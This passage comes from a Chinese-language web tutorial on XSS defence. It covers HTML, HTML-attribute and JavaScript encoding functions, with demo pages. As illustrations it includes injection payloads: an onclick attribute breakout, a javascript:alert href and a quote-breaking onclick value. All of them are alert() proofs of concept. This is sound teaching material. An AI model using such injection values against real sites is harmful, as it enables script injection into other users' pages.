            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt; &lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &quot;&amp;amp;nbsp;&quot;)&lt;/span&gt;
&lt;span&gt;            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;\'&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;#39&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;\&quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;quot;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;\/&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;#x2F;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html解码&lt;/span&gt;
        &lt;span&gt;function&lt;/span&gt;&lt;span&gt; htmlDecodeByRegExp(str) {
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (str.length &lt;/span&gt;&lt;span&gt;===&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; s;
          }
          &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (s &lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt; str)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;amp;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;lt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;gt;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;#39&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\'&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;quot;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\&quot;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            .replace(&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;&amp;amp;#x2F;&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;g, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 测试代码：&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt;&lt;span&gt; html &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;lt;br&amp;gt;aaaaaa&amp;lt;p&amp;gt;xxxxxx&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; encodeHtml &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; htmlEncodeByRegExp(html);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输出：使用正则表达式对html编码：&amp;amp;lt;br&amp;amp;gt;aaaaaa&amp;amp;lt;p&amp;amp;gt;xxxxxx&amp;amp;lt;&amp;amp;#x2F;p&amp;amp;gt;&lt;/span&gt;
&lt;span&gt;        console.log(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;使用正则表达式对html编码：&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; encodeHtml);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; decodeHtml &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; htmlDecodeByRegExp(encodeHtml);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输出：使用正则表达式对html解码：&amp;lt;br&amp;gt;aaaaaa&amp;lt;p&amp;gt;xxxxxx&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span&gt;        console.log(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;使用正则表达式对html解码：&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; decodeHtml);

      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XSS 防御HTML Attribute编码&lt;/p&gt;
&lt;p&gt;和HTML编码一样，html中的属性也要进行编码，比如 &amp;lt;input name=&quot;${name}&quot; /&amp;gt; 这样的，name是input的属性，因此在html解析时，会对name属性进行编码，因为假如${name} 的值为：&quot; &quot; onclick=&quot;alert('属性XSS')&quot; &quot; &quot; 这样的，也就是说input变成这样的了，&amp;lt;input name=&quot; &quot; onclick=&quot;alert('属性XSS')&quot; &quot; &quot;&amp;gt;&amp;lt;/input&amp;gt;，input属性name被插入onclick事件了，因此也需要针对这种常规的html属性，都需要对其进行HTML属性编码。&lt;br/&gt;因此我们需要将不可信数据放入html属性时(不含src、href、style 和 事件处理函数(onclick, onmouseover等))。需要进行HTML Attribute 编码。&lt;br/&gt;编码规则：除了字母、数字、字符以外，使用 &amp;amp;#x;16进制格式来转义ASCII值小于256所有的字符。&lt;/p&gt;
&lt;p&gt;因此编码代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForHTMLAttibute(str) {
      let encoded &lt;/span&gt;= ''&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
        let ch &lt;/span&gt;= hex =&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!/[A-Za-z0-9]/.test(str[i]) &amp;amp;&amp;amp; str.charCodeAt(i) &amp;lt; 256&lt;span&gt;) {
          hex &lt;/span&gt;= '&amp;amp;#x' + ch.charCodeAt(0).toString(16) + ';'&lt;span&gt;;
        }
        encoded &lt;/span&gt;+=&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
   };&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;XSS防御之javascript编码&lt;/p&gt;
&lt;p&gt;在上面的 XSS 防御HTML Attribute编码中我们是可以防御XSS攻击，但是它只能防御的是HTML通用属性，并不是全部属性，在html中还存在很多支持协议解析的html属性，比如 onclick, onerror, href, src 等这些，类似这些属性我们是无法通过HTML编码来防范XSS攻击的。因为浏览器会先解析html编码的字符，将其转换为该属性的值，但是该属性本身支持JS代码执行，因此游览器在HTML解码后，对该属性的值进行JS解析，因此会执行响应的代码。&lt;/p&gt;
&lt;p&gt;比如如下代码：&amp;lt;a href=&quot;javascript:alert('href xss')&quot; target=&quot;_blank&quot;&amp;gt;href xss&amp;lt;/a&amp;gt; 是可以点击的。 如果我们对该进行html属性编码一下，还是可以点击的，&lt;br/&gt;如代码：&amp;lt;a href=&quot;javascript&amp;amp;#x3a;alert&amp;amp;#x28;&amp;amp;#x27;href&amp;amp;#x20;xss&amp;amp;#x20;HTML编码无效&amp;amp;#x27;&amp;amp;#x29;&quot; target=&quot;_blank&quot;&amp;gt;href xss HTML属性编码无效&amp;lt;/a&amp;gt; 页面还是可以点击的。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522232335640-699376024.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如下对href属性编码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; str = &quot;javascript:alert('href xss')&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForHTMLAttibute(str) {
  let encoded &lt;/span&gt;= ''&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
    let ch &lt;/span&gt;= hex =&lt;span&gt; str[i];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!/[A-Za-z0-9]/.test(str[i]) &amp;amp;&amp;amp; str.charCodeAt(i) &amp;lt; 256&lt;span&gt;) {
      hex &lt;/span&gt;= '&amp;amp;#x' + ch.charCodeAt(0).toString(16) + ';'&lt;span&gt;;
    }
    encoded &lt;/span&gt;+=&lt;span&gt; hex;
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
};
console.log(encodeForHTMLAttibute(str)); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; javascript&amp;amp;#x3a;alert&amp;amp;#x28;&amp;amp;#x27;href&amp;amp;#x20;xss&amp;amp;#x27;&amp;amp;#x29;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么现在假如我们对alert('href xss')进行JavaScript编码，结果又会如何？（JavaScript编码将字符编码成\x+16进制的形式，对款字节编码成Unicode）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：XSS防御之javascript编码代码如下：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForJavascript(str) {
  let encoded &lt;/span&gt;= ''&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(let i = 0; i &amp;lt; str.length; i++&lt;span&gt;) {
    let cc &lt;/span&gt;= hex =&lt;span&gt; str[i];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!/[A-Za-z0-9]/.test(str[i]) &amp;amp;&amp;amp; str.charCodeAt(i) &amp;lt; 256&lt;span&gt;) {
      hex &lt;/span&gt;= '\\x' + cc.charCodeAt().toString(16&lt;span&gt;);
    }
    encoded &lt;/span&gt;+=&lt;span&gt; hex;
  }
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下demo演示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;javascript:alert\x28\x27href\x20xss\x27\x29&quot;&lt;/span&gt;&lt;span&gt; target&lt;/span&gt;&lt;span&gt;=&quot;_blank&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Href XSS JavaScript编码&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; str &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;alert('href xss')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForJavascript(str) {
      let encoded &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(let i &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; i &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; str.length; i&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;) {
        let cc &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;[A-Za-z0-9]&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;.test(str[i]) &lt;/span&gt;&lt;span&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span&gt; str.charCodeAt(i) &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt; &lt;span&gt;256&lt;/span&gt;&lt;span&gt;) {
          hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;\\x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; cc.charCodeAt().toString(&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;&lt;span&gt;);
        }
        encoded &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
    };
    console.log(encodeForJavascript(str)); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; alert\x28\x27href\x20xss\x27\x29&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;现在我们再来点击上面的a链接是不会有任何效果的。因此 XSS执行失败; 当然对onclick 事件等其他的也是一样的要进行编码。我们也可以继续看下：onclick属性XSS&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;onclick属性XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如现在我们来看一下on事件属性：&amp;lt;div id=&quot;test&quot; onclick=&quot;testFunc($value)&quot;&amp;gt;xxs测试&amp;lt;/div&amp;gt; （此处的$value往往一般都是后台模板替换的变量）&amp;lt;div id=&quot;test&quot; onclick=&quot;testFunc('$value')&quot;&amp;gt;xxs测试&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;当$value的值 hello world'),alert('onclick xss 时，就会触发XSS攻击；代码就会变成如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello world'),alert('onclick xss')&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因此demo如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello world'),alert('onclick xss')&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; testFunc(xx) {
      
    }
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当我点击xss测试的时候，就会变成如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522232557025-2127453.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果我们使用html编码是不行的，对$value进行HTML编码, 我们可以看看如下demo所示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;test&quot;&lt;/span&gt;&lt;span&gt; onclick&lt;/span&gt;&lt;span&gt;=&quot;testFunc('hello&amp;amp;#x20;world&amp;amp;#x27;&amp;amp;#x29;&amp;amp;#x2c;alert&amp;amp;#x28;&amp;amp;#x27;onclick&amp;amp;#x20;xss')&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs测试&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; testFunc() {}
    
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; str &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello world'),alert('onclick xss&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用正则表达式实现html编码&lt;/span&gt;
    &lt;span&gt;function&lt;/span&gt;&lt;span&gt; encodeForHTMLAttibute(str) {
      let encoded &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;(let i &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; i &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; str.length; i&lt;/span&gt;&lt;span&gt;++&lt;/span&gt;&lt;span&gt;) {
        let ch &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; str[i];
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;[A-Za-z0-9]&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;.test(str[i]) &lt;/span&gt;&lt;span&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span&gt; str.charCodeAt(i) &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt; &lt;span&gt;256&lt;/span&gt;&lt;span&gt;) {
          hex &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&amp;amp;#x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; ch.charCodeAt(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;).toString(&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
        }
        encoded &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; hex;
      }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; encoded;
    };
    console.log(encodeForHTMLAttibute(str)); 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; hello&amp;amp;#x20;world&amp;amp;#x27;&amp;amp;#x29;&amp;amp;#x2c;alert&amp;amp;#x28;&amp;amp;#x27;onclick&amp;amp;#x20;xss&lt;/span&gt;
